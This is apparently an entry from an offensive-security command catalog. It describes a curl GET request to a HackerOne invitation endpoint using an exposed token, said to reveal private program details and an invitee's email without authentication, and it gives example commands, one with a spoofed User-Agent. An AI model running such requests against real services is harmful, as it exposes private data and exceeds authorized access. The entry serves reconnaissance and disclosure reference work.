---
data: 'curl -X GET "https://hackerone.com/invitations/<token>.json"'
tags:
  - recon
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:12.921Z'
id: e8651b9a-58c0-4c43-9298-c1ec0b71c031
verified: false
validated: true
submitted: true
---
# curl-get-invitation

## Command

```bash
curl -X GET "https://hackerone.com/invitations/<token>.json"
```

## Description

This command uses curl to perform a GET request to the HackerOne invitation endpoint with an exposed token, retrieving JSON containing sensitive information without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://hackerone.com/invitations/<token>.json"` | The target URL with the invitation token substituted for <token> | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://hackerone.com/invitations/abc123def.json"
```

### Advanced Usage

```bash
curl -X GET "https://hackerone.com/invitations/<token>.json" -o response.json -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A JSON object like {"email": "user@example.com", "team": {"name": "Private Program", "handle": "handle", "profile_picture": "https://example.com/pic.jpg", "url": "https://hackerone.com/program"}}, indicating successful disclosure.

## Related

- [[Related Procedure: Access Invitation Endpoint]]
